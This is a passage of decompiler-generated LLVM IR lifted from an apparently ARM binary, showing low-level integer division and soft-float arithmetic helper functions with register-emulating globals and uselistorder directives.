  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_14a88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14a74thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_14b44() local_unnamed_addr {
dec_label_pc_14b44:
  %v0_14b44 = load i32, i32* @r1, align 4
  %v1_14b44 = icmp slt i32 %v0_14b44, 0
  %v2_14b44 = icmp eq i32 %v0_14b44, 0
  %v0_14b48 = load i32, i32* @r0, align 4
  %v2_14b48 = xor i32 %v0_14b48, %v0_14b44
  br i1 %v2_14b44, label %dec_label_pc_14c5c, label %dec_label_pc_14b50

dec_label_pc_14b50:                               ; preds = %dec_label_pc_14b44
  br i1 %v1_14b44, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_14b50
  %v2_14b50 = sub i32 0, %v0_14b44
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_14b50, %bb
  %v1_14c1c = phi i32 [ %v2_14b50, %bb ], [ %v0_14b44, %dec_label_pc_14b50 ]
  %v1_14b54 = add i32 %v1_14c1c, -1
  %v7_14b54 = icmp eq i32 %v1_14c1c, 1
  br i1 %v7_14b54, label %dec_label_pc_14bfc, label %dec_label_pc_14b5c

dec_label_pc_14b5c:                               ; preds = %thread-pre-split
  %v1_14b5c = icmp slt i32 %v0_14b48, 0
  br i1 %v1_14b5c, label %bb86, label %bb87

bb86:                                             ; preds = %dec_label_pc_14b5c
  %v2_14b60 = sub i32 0, %v0_14b48
  br label %bb87

bb87:                                             ; preds = %dec_label_pc_14b5c, %bb86
  %v0_14c50 = phi i32 [ %v0_14b48, %dec_label_pc_14b5c ], [ %v2_14b60, %bb86 ]
  %v3_14b64 = icmp uge i32 %v0_14c50, %v1_14c1c
  %v9_14b64 = icmp eq i32 %v0_14c50, %v1_14c1c
  %v2_14b68 = xor i1 %v3_14b64, true
  %v3_14b68 = or i1 %v9_14b64, %v2_14b68
  br i1 %v3_14b68, label %dec_label_pc_14c08, label %dec_label_pc_14b6c

dec_label_pc_14b6c:                               ; preds = %bb87
  %v2_14b6c = and i32 %v1_14b54, %v1_14c1c
  %v4_14b6c = icmp eq i32 %v2_14b6c, 0
  br i1 %v4_14b6c, label %dec_label_pc_14c18, label %dec_label_pc_14b74

dec_label_pc_14b74:                               ; preds = %dec_label_pc_14b6c
  %v3_14b74 = icmp ult i32 %v1_14c1c, 536870912
  br i1 %v3_14b74, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_14b74
  %v4_14b78 = mul i32 %v1_14c1c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_14b74, %.thread
  %v0_14b98.pr40.ph = phi i32 [ %v4_14b78, %.thread ], [ %v1_14c1c, %dec_label_pc_14b74 ]
  %storemerge144 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_14b74 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb90
  %v0_14b98.pr40 = phi i32 [ %v4_14b8c, %bb90 ], [ %v0_14b98.pr40.ph, %.preheader.preheader ]
  %v1_14b90 = phi i32 [ %v4_14b90, %bb90 ], [ %storemerge144, %.preheader.preheader ]
  %v2_14b84 = icmp ugt i32 %v0_14b98.pr40, 268435455
  br i1 %v2_14b84, label %.thread3, label %bb88

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_14b98thread-pre-split.loopexit

bb88:                                             ; preds = %.preheader
  %v4_14b88 = icmp ult i32 %v0_14b98.pr40, %v0_14c50
  br i1 %v4_14b88, label %bb89, label %dec_label_pc_14b98thread-pre-split.loopexit.loopexit

bb89:                                             ; preds = %bb88
  %v2_14b8c = and i32 %v0_14b98.pr40, 268435456
  %v3_14b8c = icmp eq i32 %v2_14b8c, 0
  %v4_14b8c = mul i32 %v0_14b98.pr40, 16
  br i1 %v3_14b8c, label %bb90, label %dec_label_pc_14b98.loopexit

bb90:                                             ; preds = %bb89
  %v2_14b90 = and i32 %v1_14b90, 268435456
  %v3_14b90 = icmp eq i32 %v2_14b90, 0
  %v4_14b90 = mul i32 %v1_14b90, 16
  br i1 %v3_14b90, label %.preheader, label %dec_label_pc_14b98thread-pre-split.loopexit.loopexit

dec_label_pc_14b98thread-pre-split.loopexit.loopexit: ; preds = %bb90, %bb88
  %v1_14ba452.ph = phi i32 [ %v1_14b90, %bb88 ], [ %v4_14b90, %bb90 ]
  %v0_14b98.pr42.ph = phi i32 [ %v0_14b98.pr40, %bb88 ], [ %v4_14b8c, %bb90 ]
  br label %dec_label_pc_14b98thread-pre-split.loopexit

dec_label_pc_14b98thread-pre-split.loopexit:      ; preds = %dec_label_pc_14b98thread-pre-split.loopexit.loopexit, %.thread3
  %v1_14ba452 = phi i32 [ %v1_14b90, %.thread3 ], [ %v1_14ba452.ph, %dec_label_pc_14b98thread-pre-split.loopexit.loopexit ]
  %v0_14b98.pr42 = phi i32 [ %v0_14b98.pr40, %.thread3 ], [ %v0_14b98.pr42.ph, %dec_label_pc_14b98thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14b98thread-pre-split

dec_label_pc_14b98thread-pre-split:               ; preds = %dec_label_pc_14b98thread-pre-split.loopexit, %bb92
  %v1_14ba450 = phi i32 [ %v1_14ba452, %dec_label_pc_14b98thread-pre-split.loopexit ], [ %v3_14ba4, %bb92 ]
  %v2_14b9c48 = phi i32 [ %v0_14c50, %dec_label_pc_14b98thread-pre-split.loopexit ], [ %v2_14b9c, %bb92 ]
  %v0_14b98.pr = phi i32 [ %v0_14b98.pr42, %dec_label_pc_14b98thread-pre-split.loopexit ], [ %v3_14ba0, %bb92 ]
  br label %dec_label_pc_14b98

dec_label_pc_14b98.loopexit:                      ; preds = %bb89
  br label %dec_label_pc_14b98

dec_label_pc_14b98:                               ; preds = %dec_label_pc_14b98.loopexit, %dec_label_pc_14b98thread-pre-split
  %v1_14ba4 = phi i32 [ %v1_14ba450, %dec_label_pc_14b98thread-pre-split ], [ %v1_14b90, %dec_label_pc_14b98.loopexit ]
  %v2_14b9c = phi i32 [ %v2_14b9c48, %dec_label_pc_14b98thread-pre-split ], [ %v0_14c50, %dec_label_pc_14b98.loopexit ]
  %v1_14ba0 = phi i32 [ %v0_14b98.pr, %dec_label_pc_14b98thread-pre-split ], [ %v4_14b8c, %dec_label_pc_14b98.loopexit ]
  %v2_14b98 = icmp slt i32 %v1_14ba0, 0
  br i1 %v2_14b98, label %dec_label_pc_14bac, label %bb91

bb91:                                             ; preds = %dec_label_pc_14b98
  %v4_14b9c = icmp ult i32 %v1_14ba0, %v2_14b9c
  br i1 %v4_14b9c, label %bb92, label %dec_label_pc_14bac

bb92:                                             ; preds = %bb91
  %v3_14ba0 = mul i32 %v1_14ba0, 2
  %v2_14ba4 = icmp slt i32 %v1_14ba4, 0
  %v3_14ba4 = mul i32 %v1_14ba4, 2
  br i1 %v2_14ba4, label %dec_label_pc_14bac, label %dec_label_pc_14b98thread-pre-split

dec_label_pc_14bac:                               ; preds = %bb91, %dec_label_pc_14b98, %bb92
  %v2_14bb863 = phi i32 [ %v3_14ba4, %bb92 ], [ %v1_14ba4, %bb91 ], [ %v1_14ba4, %dec_label_pc_14b98 ]
  %v1_14bb055 = phi i32 [ %v3_14ba0, %bb92 ], [ %v1_14ba0, %bb91 ], [ %v1_14ba0, %dec_label_pc_14b98 ]
  br label %dec_label_pc_14bb0

dec_label_pc_14bb0:                               ; preds = %.thread13, %dec_label_pc_14bac
  %v1_14be4 = phi i32 [ %v4_14be4, %.thread13 ], [ %v2_14bb863, %dec_label_pc_14bac ]
  %v1_14bb8 = phi i32 [ %v1_14bf4, %.thread13 ], [ 0, %dec_label_pc_14bac ]
  %v1_14be8 = phi i32 [ %v4_14be8, %.thread13 ], [ %v1_14bb055, %dec_label_pc_14bac ]
  %v1_14bb4 = phi i32 [ %v0_14be0, %.thread13 ], [ %v0_14c50, %dec_label_pc_14bac ]
  %v3_14bb0 = icmp ult i32 %v1_14bb4, %v1_14be8
  br i1 %v3_14bb0, label %.thread8, label %bb93

bb93:                                             ; preds = %dec_label_pc_14bb0
  %v3_14bb4 = sub i32 %v1_14bb4, %v1_14be8
  %v3_14bb8 = or i32 %v1_14bb8, %v1_14be4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_14bb0, %bb93
  %v1_14bc0 = phi i32 [ %v1_14bb4, %dec_label_pc_14bb0 ], [ %v3_14bb4, %bb93 ]
  %v1_14bc4 = phi i32 [ %v1_14bb8, %dec_label_pc_14bb0 ], [ %v3_14bb8, %bb93 ]
  %v4_14bbc = udiv i32 %v1_14be8, 2
  %v6_14bbc = icmp ult i32 %v1_14bc0, %v4_14bbc
  br i1 %v6_14bbc, label %.thread9, label %bb94

bb94:                                             ; preds = %.thread8
  %v3_14bc0 = urem i32 %v1_14be8, 2
  %v4_14bc0 = icmp eq i32 %v3_14bc0, 0
  %v6_14bc0 = sub i32 %v1_14bc0, %v4_14bbc
  br i1 %v4_14bc0, label %.thread9, label %bb95

bb95:                                             ; preds = %bb94
  %v5_14bc4 = udiv i32 %v1_14be4, 2
  %v6_14bc4 = or i32 %v1_14bc4, %v5_14bc4
  br label %.thread9

.thread9:                                         ; preds = %bb94, %.thread8, %bb95
  %v1_14bcc = phi i32 [ %v6_14bc0, %bb94 ], [ %v1_14bc0, %.thread8 ], [ %v6_14bc0, %bb95 ]
  %v1_14bd0 = phi i32 [ %v1_14bc4, %bb94 ], [ %v1_14bc4, %.thread8 ], [ %v6_14bc4, %bb95 ]
  %v4_14bc8 = udiv i32 %v1_14be8, 4
  %v6_14bc8 = icmp ult i32 %v1_14bcc, %v4_14bc8
  br i1 %v6_14bc8, label %.thread10, label %bb96

bb96:                                             ; preds = %.thread9
  %v3_14bcc = and i32 %v1_14be8, 2
  %v4_14bcc = icmp eq i32 %v3_14bcc, 0
  %v6_14bcc = sub i32 %v1_14bcc, %v4_14bc8
  br i1 %v4_14bcc, label %.thread10, label %bb97

bb97:                                             ; preds = %bb96
  %v5_14bd0 = udiv i32 %v1_14be4, 4
  %v6_14bd0 = or i32 %v1_14bd0, %v5_14bd0
  br label %.thread10

.thread10:                                        ; preds = %bb96, %.thread9, %bb97
  %v1_14bd8 = phi i32 [ %v6_14bcc, %bb96 ], [ %v1_14bcc, %.thread9 ], [ %v6_14bcc, %bb97 ]
  %v1_14bdc = phi i32 [ %v1_14bd0, %bb96 ], [ %v1_14bd0, %.thread9 ], [ %v6_14bd0, %bb97 ]
  %v4_14bd4 = udiv i32 %v1_14be8, 8
  %v6_14bd4 = icmp ult i32 %v1_14bd8, %v4_14bd4
  br i1 %v6_14bd4, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %.thread10
  %v3_14bd8 = and i32 %v1_14be8, 4
  %v4_14bd8 = icmp eq i32 %v3_14bd8, 0
  %v6_14bd8 = sub i32 %v1_14bd8, %v4_14bd4
  br i1 %v4_14bd8, label %thread-pre-split12, label %bb99

bb99:                                             ; preds = %bb98
  %v5_14bdc = udiv i32 %v1_14be4, 8
  %v6_14bdc = or i32 %v1_14bdc, %v5_14bdc
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb99, %.thread10, %bb98
  %v1_14bf4 = phi i32 [ %v1_14bdc, %bb98 ], [ %v1_14bdc, %.thread10 ], [ %v6_14bdc, %bb99 ]
  %v0_14be0 = phi i32 [ %v6_14bd8, %bb98 ], [ %v1_14bd8, %.thread10 ], [ %v6_14bd8, %bb99 ]
  %v2_14be0 = icmp eq i32 %v0_14be0, 0
  br i1 %v2_14be0, label %dec_label_pc_14bf0, label %bb100

bb100:                                            ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_14be4, 16
  br i1 %tmp, label %dec_label_pc_14bf0, label %.thread13

.thread13:                                        ; preds = %bb100
  %v4_14be4 = udiv i32 %v1_14be4, 16
  %v4_14be8 = udiv i32 %v1_14be8, 16
  br label %dec_label_pc_14bb0

dec_label_pc_14bf0:                               ; preds = %thread-pre-split12, %bb100
  %v1_14bf0 = icmp slt i32 %v2_14b48, 0
  br i1 %v1_14bf0, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_14bf0
  %v2_14bf4 = sub i32 0, %v1_14bf4
  br label %.thread16

.thread16:                                        ; preds = %bb105, %bb104, %bb102, %dec_label_pc_14bfc, %dec_label_pc_14bf0, %bb101
  %v1_14bf8 = phi i32 [ %v1_14bf4, %dec_label_pc_14bf0 ], [ %v2_14bf4, %bb101 ], [ %v2_14c00, %bb102 ], [ undef, %dec_label_pc_14bfc ], [ %v1_14c1480, %bb104 ], [ %v2_14c10, %bb105 ]
  ret i32 %v1_14bf8

dec_label_pc_14bfc:                               ; preds = %thread-pre-split
  br i1 %v1_14b44, label %bb102, label %.thread16

bb102:                                            ; preds = %dec_label_pc_14bfc
  %v2_14c00 = sub i32 0, %v0_14b48
  br label %.thread16

dec_label_pc_14c08:                               ; preds = %bb87
  br i1 %v3_14b64, label %bb104, label %bb103

bb103:                                            ; preds = %dec_label_pc_14c08
  br label %bb104

bb104:                                            ; preds = %dec_label_pc_14c08, %bb103
  %v1_14c1480 = phi i32 [ %v0_14b48, %dec_label_pc_14c08 ], [ 0, %bb103 ]
  br i1 %v9_14b64, label %bb105, label %.thread16

bb105:                                            ; preds = %bb104
  %v4_14c0c = ashr i32 %v2_14b48, 31
  %v2_14c10 = or i32 %v4_14c0c, 1
  br label %.thread16

dec_label_pc_14c18:                               ; preds = %dec_label_pc_14b6c
  %v2_14c18 = icmp ugt i32 %v1_14c1c, 65535
  br i1 %v2_14c18, label %bb106, label %.thread19

bb106:                                            ; preds = %dec_label_pc_14c18
  %v2_14c1c = and i32 %v1_14c1c, 32768
  %v3_14c1c = icmp eq i32 %v2_14c1c, 0
  %v4_14c1c = udiv i32 %v1_14c1c, 65536
  br i1 %v3_14c1c, label %.thread19, label %bb107

.thread19:                                        ; preds = %bb106, %dec_label_pc_14c18
  %v0_14c2870 = phi i32 [ %v1_14c1c, %dec_label_pc_14c18 ], [ %v4_14c1c, %bb106 ]
  br label %bb107

bb107:                                            ; preds = %bb106, %.thread19
  %v1_14c2c = phi i32 [ %v0_14c2870, %.thread19 ], [ %v4_14c1c, %bb106 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb106 ]
  %v2_14c28 = icmp ugt i32 %v1_14c2c, 255
  br i1 %v2_14c28, label %bb108, label %.thread20

bb108:                                            ; preds = %bb107
  %v2_14c2c = and i32 %v1_14c2c, 128
  %v3_14c2c = icmp eq i32 %v2_14c2c, 0
  %v4_14c2c = udiv i32 %v1_14c2c, 256
  br i1 %v3_14c2c, label %.thread20, label %bb109

bb109:                                            ; preds = %bb108
  %v2_14c30 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb108, %bb107, %bb109
  %v1_14c3c = phi i32 [ %storemerge, %bb107 ], [ %storemerge, %bb108 ], [ %v2_14c30, %bb109 ]
  %v1_14c38 = phi i32 [ %v1_14c2c, %bb107 ], [ %v4_14c2c, %bb108 ], [ %v4_14c2c, %bb109 ]
  %v2_14c34 = icmp ugt i32 %v1_14c38, 15
  br i1 %v2_14c34, label %bb110, label %.thread21

bb110:                                            ; preds = %.thread20
  %v2_14c38 = and i32 %v1_14c38, 8
  %v3_14c38 = icmp eq i32 %v2_14c38, 0
  %v4_14c38 = udiv i32 %v1_14c38, 16
  br i1 %v3_14c38, label %.thread21, label %bb111

bb111:                                            ; preds = %bb110
  %v2_14c3c = add nsw i32 %v1_14c3c, 4
  br label %.thread21

.thread21:                                        ; preds = %bb110, %.thread20, %bb111
  %v4_14c44 = phi i32 [ %v1_14c3c, %.thread20 ], [ %v1_14c3c, %bb110 ], [ %v2_14c3c, %bb111 ]
  %v5_14c48 = phi i32 [ %v1_14c38, %.thread20 ], [ %v4_14c38, %bb110 ], [ %v4_14c38, %bb111 ]
  %v2_14c40 = icmp ugt i32 %v5_14c48, 3
  %v7_14c40 = icmp eq i32 %v5_14c48, 4
  %v2_14c44 = xor i1 %v7_14c40, true
  %v3_14c44 = and i1 %v2_14c40, %v2_14c44
  br i1 %v3_14c44, label %bb112, label %bb113

bb112:                                            ; preds = %.thread21
  %v5_14c44 = add nsw i32 %v4_14c44, 3
  br label %bb113

bb113:                                            ; preds = %.thread21, %bb112
  %v4_14c48 = phi i32 [ %v4_14c44, %.thread21 ], [ %v5_14c44, %bb112 ]
  %v2_14c48 = xor i1 %v2_14c40, true
  %v3_14c48 = or i1 %v7_14c40, %v2_14c48
  br i1 %v3_14c48, label %bb114, label %bb115

bb114:                                            ; preds = %bb113
  %v8_14c48 = udiv i32 %v5_14c48, 2
  %v9_14c48 = add i32 %v4_14c48, %v8_14c48
  br label %bb115

bb115:                                            ; preds = %bb113, %bb114
  %v1_14c50 = phi i32 [ %v4_14c48, %bb113 ], [ %v9_14c48, %bb114 ]
  %v1_14c4c = icmp slt i32 %v2_14b48, 0
  %v6_14c50 = lshr i32 %v0_14c50, %v1_14c50
  %v2_14c54 = sub i32 0, %v6_14c50
  %v2_14c54.v6_14c50 = select i1 %v1_14c4c, i32 %v2_14c54, i32 %v6_14c50
  ret i32 %v2_14c54.v6_14c50

dec_label_pc_14c5c:                               ; preds = %dec_label_pc_14b44
  %v0_14c5c = load i32, i32* @lr, align 4
  %v0_14c60 = call i32 @function_ca14()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_14c5c)
  %v9_14c6c = load i32, i32* @lr, align 4
  %v0_14c70 = call i32 @function_14b44()
  store i32 %v9_14c6c, i32* @lr, align 4
  ret i32 %v0_14c70

; uselistorder directives
  uselistorder i32 %v4_14c48, { 1, 0 }
  uselistorder i1 %v7_14c40, { 1, 0 }
  uselistorder i32 %v4_14c38, { 1, 0 }
  uselistorder i32 %v1_14c38, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14c2c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14c2c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14c1c, { 1, 0 }
  uselistorder i32 %v0_14be0, { 1, 0 }
  uselistorder i32 %v4_14bd4, { 1, 0 }
  uselistorder i32 %v1_14bdc, { 1, 2, 0 }
  uselistorder i32 %v4_14bc8, { 1, 0 }
  uselistorder i32 %v1_14bd0, { 1, 2, 0 }
  uselistorder i32 %v4_14bbc, { 1, 0 }
  uselistorder i32 %v1_14bc4, { 1, 2, 0 }
  uselistorder i32 %v1_14be8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_14bb8, { 1, 0 }
  uselistorder i32 %v1_14be4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_14ba4, { 1, 0 }
  uselistorder i32 %v3_14ba0, { 1, 0 }
  uselistorder i32 %v1_14ba0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_14b9c, { 1, 0 }
  uselistorder i32 %v1_14ba4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14b90, { 1, 0 }
  uselistorder i32 %v4_14b8c, { 2, 1, 0 }
  uselistorder i32 %v1_14b90, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_14b98.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_14b64, { 1, 0 }
  uselistorder i32 %v1_14c1c, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_14b48, { 1, 0, 2 }
  uselistorder i32 %v0_14b48, { 2, 1, 3, 4, 5, 0 }
  uselistorder i32 %v0_14b44, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @function_14b44, { 2, 0, 1 }
  uselistorder i32 ()* @function_ca14, { 3, 2, 1, 0 }
  uselistorder i32 268435455, { 2, 3, 4, 0, 5, 1 }
  uselistorder label %bb115, { 1, 0 }
  uselistorder label %bb113, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_14bf0, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_14bac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14b98thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_14c84(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c84:
  %v1_14c84 = sub i32 0, %arg1
  store i32 %v1_14c84, i32* @r0, align 4
  %v0_14c88 = call i32 @function_14c90()
  ret i32 %v0_14c88

; uselistorder directives
  uselistorder i32 ()* @function_14c90, { 1, 0 }
}

define i32 @function_14c8c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14c8c:
  %v2_14c8c = load i32, i32* @r0, align 4
  ret i32 %v2_14c8c
}

define i32 @function_14c90() local_unnamed_addr {
dec_label_pc_14c90:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14c90 = load i32, i32* @r4, align 4
  store i32 %v3_14c90, i32* %stack_var_-12, align 4
  %v6_14c90 = load i32, i32* @r5, align 4
  %v0_14c94 = load i32, i32* @r0, align 4
  %v2_14c94 = mul i32 %v0_14c94, 2
  store i32 %v2_14c94, i32* %r4.global-to-local, align 4
  %v0_14c98 = load i32, i32* @r2, align 4
  %v2_14c98 = mul i32 %v0_14c98, 2
  store i32 %v2_14c98, i32* %r5.global-to-local, align 4
  %v4_14c9c = icmp eq i32 %v2_14c98, %v2_14c94
  %v1_14ca0 = load i32, i32* @r1, align 4
  br i1 %v4_14c9c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14c90
  %v2_14ca0 = load i32, i32* @r3, align 4
  %v5_14ca0 = icmp eq i32 %v2_14ca0, %v1_14ca0
  br i1 %v5_14ca0, label %.thread3, label %.thread

.thread:                                          ; preds = %dec_label_pc_14c90, %bb
  %v3_14ca4 = or i32 %v1_14ca0, %v2_14c94
  %v5_14ca4 = icmp eq i32 %v3_14ca4, 0
  br i1 %v5_14ca4, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_14ca8 = load i32, i32* @r3, align 4
  %v3_14ca8 = or i32 %v2_14ca8, %v2_14c98
  %v5_14ca8 = icmp eq i32 %v3_14ca8, 0
  br i1 %v5_14ca8, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_14c94.off = add i32 %v2_14c94, 4194303
  %tmp = icmp ult i32 %v2_14c94.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_14c98.off = add i32 %v2_14c98, 4194303
  %tmp18 = icmp ult i32 %v2_14c98.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_14cb4 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_14cb4, i32 ptrtoint (i32* @global_var_14ed4.617 to i32))
  %v0_14cb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_14cb8 = udiv i32 %v0_14cb8, 2097152
  store i32 %v3_14cb8, i32* @r4, align 4
  %v1_14cbc = load i32, i32* %r5.global-to-local, align 4
  %v4_14cbc = udiv i32 %v1_14cbc, 2097152
  %v5_14cbc = sub nsw i32 %v4_14cbc, %v3_14cb8
  %v5_14cc0 = icmp ult i32 %v4_14cbc, %v3_14cb8
  br i1 %v5_14cc0, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_14cc0 = sub nsw i32 0, %v5_14cbc
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_14cc0, %bb14 ], [ %v5_14cbc, %.thread3 ]
  %v1_14d20 = phi i32 [ %v7_14cc0, %bb14 ], [ %v5_14cbc, %.thread3 ]
  store i32 %storemerge, i32* @r5, align 4
  %v7_14cc4 = icmp ugt i32 %v4_14cbc, %v3_14cb8
  br i1 %v7_14cc4, label %dec_label_pc_14cc8, label %dec_label_pc_14ce4

dec_label_pc_14cc8:                               ; preds = %bb15
  %v2_14cc8 = add nsw i32 %v1_14d20, %v3_14cb8
  store i32 %v2_14cc8, i32* @r4, align 4
  %v0_14ccc = load i32, i32* @r1, align 4
  %v1_14ccc = load i32, i32* @r3, align 4
  %v0_14cd0 = load i32, i32* @r0, align 4
  %v1_14cd0 = load i32, i32* @r2, align 4
  store i32 %v1_14ccc, i32* @r1, align 4
  store i32 %v1_14cd0, i32* %r0.global-to-local, align 4
  store i32 %v0_14ccc, i32* @r3, align 4
  store i32 %v0_14cd0, i32* @r2, align 4
  br label %dec_label_pc_14ce4

dec_label_pc_14ce4:                               ; preds = %bb15, %dec_label_pc_14cc8
  %v0_14d20 = phi i32 [ %v2_14cc8, %dec_label_pc_14cc8 ], [ %v3_14cb8, %bb15 ]
  %.0 = phi i32 [ %v1_14cd0, %dec_label_pc_14cc8 ], [ undef, %bb15 ]
  %tmp19 = icmp ugt i32 %v1_14d20, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_14ce4
  %v6_14ce8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_14ce8, i32* @r4, align 4
  store i32 %v6_14c90, i32* @r5, align 4
  ret i32 %.0

bb17:                                             ; preds = %dec_label_pc_14ce4
  %v3_14cec = icmp sgt i32 %.0, -1
  %v4_14cf8 = urem i32 %.0, 1048576
  %v5_14cf8 = or i32 %v4_14cf8, 1048576
  store i32 %v5_14cf8, i32* %r0.global-to-local, align 4
  br i1 %v3_14cec, label %dec_label_pc_14d08, label %dec_label_pc_14d00

dec_label_pc_14d00:                               ; preds = %bb17
  %v0_14d00 = load i32, i32* @r1, align 4
  %v2_14d00 = icmp eq i32 %v0_14d00, 0
  %v2_14d04 = icmp eq i1 %v2_14d00, false
  %v5_14d04 = sext i1 %v2_14d04 to i32
  %v6_14d04 = sub nsw i32 %v5_14d04, %v5_14cf8
  store i32 %v6_14d04, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d08

dec_label_pc_14d08:                               ; preds = %bb17, %dec_label_pc_14d00
  %v0_14d08 = load i32, i32* @r2, align 4
  %v3_14d08 = icmp sgt i32 %v0_14d08, -1
  br i1 %v3_14d08, label %dec_label_pc_14d20, label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14d08
  br label %dec_label_pc_14d20

dec_label_pc_14d20:                               ; preds = %dec_label_pc_14d08, %dec_label_pc_14d18
  %v4_14d20 = icmp eq i32 %v0_14d20, %v1_14d20
  call void @__pseudo_cond_branch(i1 %v4_14d20, i32 ptrtoint (i32* @global_var_14ebc.618 to i32))
  %v1_14d24 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_14d24

; uselistorder directives
  uselistorder i32 %.0, { 1, 0, 2 }
  uselistorder i32 %v1_14cd0, { 1, 0 }
  uselistorder i32 %v4_14cbc, { 2, 1, 0 }
  uselistorder i32 %v3_14cb8, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_14ca0, { 1, 0 }
  uselistorder i32 %v2_14c98, { 1, 3, 0, 2 }
  uselistorder i32 %v2_14c94, { 1, 3, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 undef, { 1, 0 }
  uselistorder label %dec_label_pc_14d20, { 1, 0 }
  uselistorder label %dec_label_pc_14d08, { 1, 0 }
  uselistorder label %dec_label_pc_14ce4, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14d28() local_unnamed_addr {
dec_label_pc_14d28:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_14d28 = load i32, i32* @r4, align 4
  %v1_14d28 = add i32 %v0_14d28, -1
  store i32 %v1_14d28, i32* @r4, align 4
  %v0_14d2c = load i32, i32* @r5, align 4
  %v1_14d2c = sub i32 32, %v0_14d2c
  %v5_14d30 = icmp sgt i32 %v0_14d2c, 32
  br i1 %v5_14d30, label %dec_label_pc_14d4c, label %dec_label_pc_14d34

dec_label_pc_14d34:                               ; preds = %dec_label_pc_14d28
  %v0_14d34 = load i32, i32* @r3, align 4
  %v6_14d34 = shl i32 %v0_14d34, %v1_14d2c
  store i32 %v6_14d34, i32* %ip.global-to-local, align 4
  %v0_14d38 = load i32, i32* @r1, align 4
  %v3_14d38 = add i32 %v0_14d2c, -1
  %v4_14d38 = shl i32 1, %v3_14d38
  %v7_14d38 = lshr i32 %v0_14d34, %v0_14d2c
  %v8_14d38 = add i32 %v0_14d38, %v7_14d38
  %v9_14d38 = icmp ult i32 %v8_14d38, %v0_14d38
  %v0_14d3c = load i32, i32* @r0, align 4
  %v2_14d3c = zext i1 %v9_14d38 to i32
